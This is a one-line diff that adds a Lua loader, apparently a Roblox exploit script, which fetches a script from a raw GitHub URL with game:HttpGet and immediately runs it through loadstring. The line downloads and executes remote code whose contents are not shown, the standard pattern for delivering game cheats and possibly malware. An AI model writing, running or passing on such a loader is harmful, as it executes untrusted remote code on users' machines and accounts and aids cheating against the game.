@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/cargo-run-an-airline-spam7-hpv2h6sqo7ca0z.lua"))()
